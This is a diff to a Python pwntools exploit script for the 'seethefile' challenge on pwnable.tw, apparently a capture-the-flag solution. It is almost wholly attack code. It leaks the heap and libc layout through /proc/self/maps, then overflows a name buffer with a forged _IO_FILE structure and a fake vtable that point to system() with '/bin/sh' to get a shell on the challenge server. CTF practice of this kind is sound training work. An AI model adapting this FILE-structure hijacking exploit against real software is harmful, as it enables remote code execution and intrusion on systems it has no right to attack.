@@ -3,7 +3,7 @@
 
 from pwn import *
 
-debug = True
+debug = False
 
 def menu(choice):
 	s.recvuntil('Your choice :')
@@ -51,7 +51,8 @@ def exploit():
 	# libc leak
 	openfile('/proc/self/maps')
 	readfile()
-	readfile()
+	if debug:
+		readfile()
 	re = writefile()
 	start = re.find('[heap]') + 7
 	re = re[start : start+8]
@@ -83,18 +84,19 @@ def exploit():
 	name = 0x0804B260
 	fake_io_addr = name + 0x20 + 4
 
-	fake_struct = '/bin/sh;'					# fake _io_struct
-	fake_struct += 'c' * (0x48 - len(fake_struct))
-	fake_struct += p32(fake_io_addr + 0x200)	# fake _io_struct, (pointer to null)
-	fake_struct += 'd' * (0x94 - len(fake_struct))
+	#fake_struct = p32(0xffffffff)					# fake _io_struct
+	fake_struct = '/bin/sh\x00'
+	fake_struct += '\x00' * (0x48 - len(fake_struct))
+	fake_struct += p32(name)			# fake _io_struct, (pointer to null)
+	fake_struct += '\x00' * (0x94 - len(fake_struct))
 	fake_struct += p32(fake_io_addr + len(fake_struct) + 4)
 
 	fake_vtable = p32(0) * 2
 	fake_vtable += p32(system_addr)				# fake vtable, fake _io_finish()
-	fake_vtable += '\x00' * (0x44 - len(fake_vtable))
+	fake_vtable += p32(0) * 14
 	fake_vtable += p32(system_addr)				# fake vtable, fake _io_close()
 
-	payload = 'a' * 0x20
+	payload = '\x00' * 0x20
 	payload += p32(fake_io_addr)
 	payload += fake_struct
 	payload += fake_vtable
@@ -104,8 +106,8 @@ def exploit():
 if __name__ == '__main__':
 
 	if debug:
-		#s = process("./seethefile")
-		s = process(['./seethefile'], env={'LD_PRELOAD':'./libc_32.so.6'})
+		s = process("./seethefile")
+		#s = process(['./seethefile'], env={'LD_PRELOAD':'./libc_32.so.6'})
 		pause()
 	else:
 	    s = remote('chall.pwnable.tw', 10200)
